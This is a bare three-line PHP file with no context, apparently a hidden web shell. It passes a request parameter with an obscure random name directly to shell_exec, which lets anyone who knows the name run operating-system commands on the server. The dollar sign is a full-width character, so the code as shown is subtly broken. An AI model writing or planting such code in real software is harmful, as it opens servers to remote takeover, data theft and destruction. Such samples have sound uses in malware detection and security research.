<?php
shell_exec(＄_GET['OiglDgA9']);
?>
